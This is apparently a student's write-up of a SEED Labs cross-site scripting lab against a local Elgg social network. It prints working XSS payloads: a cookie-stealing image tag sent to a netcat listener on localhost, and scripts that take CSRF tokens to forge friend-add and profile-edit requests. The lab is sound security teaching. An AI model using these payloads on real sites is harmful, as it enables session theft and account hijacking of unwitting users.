# CS 4173 Lab 5
#### Cross-Site Scripting Attack Lab

## Prerequisites
Versions of software used listed here:
- Environment: SEEDUbuntu 16.04

## Task 1: Posting a Malicious Message to Display an Alert Window

In this task,verify that the system is indeed vulnerable to cross-site scripting attacks. An easy way to test this in general is to submit content with a `<script>` tag and see if something simple such as an alert box can be called. We post the following contents to Samy's profile:

```html
<script>alert('XSS');</script>
```

Upon visiting Samy's profile, the visitor now gets an alert box popup saying "XSS" which confirms that the system is susceptible to XSS attacks.

## Task 2: Posting a Malicious Message to Display Cookies

Now that we can use XSS on this system, we can now start attempting to grab private user data, in particular cookies. We can modify the script above to do so:

```html
<script>alert(document.cookie);</script>
```

## Task 3: Stealing Cookies from the Victim’s Machine

With the above method, we can alert the cookies to the user's screen, but the attacker is not yet able to view this information. In order to transfer this data to the attacker, they can use a malicioius HTTP GET request, for example with a fake image. We can append the information to this request which goes to the attacker's machine. In this example, we are using the localhost IP address since we are testing on the same machine:

```html
<script>document.write('<img src="http://127.0.0.1:5555?c=' + escape(document.cookie) + '>')</script>
```

Then, using the `netcat` utility, we can view the incoming GET requests from the attacker which will include the appended cookie data:

```
$ nc -l 5555 -v
```

## Task 4: Becoming the Victim’s Friend

For a cross-site scripting attack, the information may not need to be sent to the attacker, but can be used directly in the attacker's script as demonstrated in this task. By using cross-site scripting in this case, the attacker (Samy) can use a script to take the user's CSRF tokens and make a request to add himself as a friend:

```html
<script type="text/javascript">
    window.onload = function () {
        let xhr = null;

        let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
        let token = "&__elgg_token="+elgg.security.token.__elgg_token;

        //Construct the HTTP request to add Samy as a friend.
        let sendurl = "http://www.xsslabelgg.com/action/friends/add?friend=47" + ts + token;

        //Create and send xhr request to add friend
        xhr = new XMLHttpRequest();
        xhr.open("GET",sendurl,true);
        xhr.setRequestHeader("Host","www.xsslabelgg.com");
        xhr.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
        xhr.send();
    }
</script>
```

### Question 1

These two lines retrieve the tokens which are used to prevent CSRF attacks. In order to make a request, one must have the correct tokens or else the server will reject the request.

### Question 2

If the user can only use the rich text editor, they will not be able to insert malicious scripts into their profile. If we inspect the POST request, we can see that if we attempt to insert a script through the editor, characters such as the angle brackets are converted to their respective HTML entities like `&lt;` and `&gt;` for example. This prevents the HTML from parsing it as an HTML `script` tag and reading it as a regular string instead.

## Task 5: Modifying the Victim’s Profile

In addition to adding himself as a friend, Samy can also use cross-site scripting attack in order to modify a user's profile. Again, by taking the CSRF tokens and their guid, Samy can make a malicious POST request once he knows the structure of the request. This can be done by inspecting the contents of the request with HTTP Header Live. The following script will change the profile of anyone visiting Samy's profile to say "Samy is my hero":

```html
<script type="text/javascript">
    window.onload = function(){
        //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
        //and Security Token __elgg_token
        let userName = elgg.session.user.name;
        let guid = "&guid="+elgg.session.user.guid;
        let ts = "&__elgg_ts="+elgg.security.token.__elgg_ts;
        let token = "__elgg_token="+elgg.security.token.__elgg_token;
        
        //Construct the content of your url.
        let sendurl = "http://www.xsslabelgg.com/action/profile/edit";
        let content = token + ts + "&description=Samy is my hero&accesslevel[description]=2" + guid;
        
        let samyGuid = 47;
        if(elgg.session.user.guid != samyGuid) {
            //Create and send xhr request to modify profile
            let xhr = null;
            xhr = new XMLHttpRequest();
            xhr.open("POST",sendurl,true);
            xhr.setRequestHeader("Host","www.xsslabelgg.com");
            xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            xhr.send(content);
        }
    }
</script>
```

### Question 3

We need this line in order to make the attack successful since the page redirects to the user's profile after saving their profile. If we remove this line (or set it to `if (true)`), once Samy saves the malicious script, it will immediately send the POST request to change his own profile to say "Samy is my hero" and therefore when future visitors arrive at his profile, that is all they will see. Therefore, we first need to check if the user viewing the page is Samy himself; if so, the attack should not happen.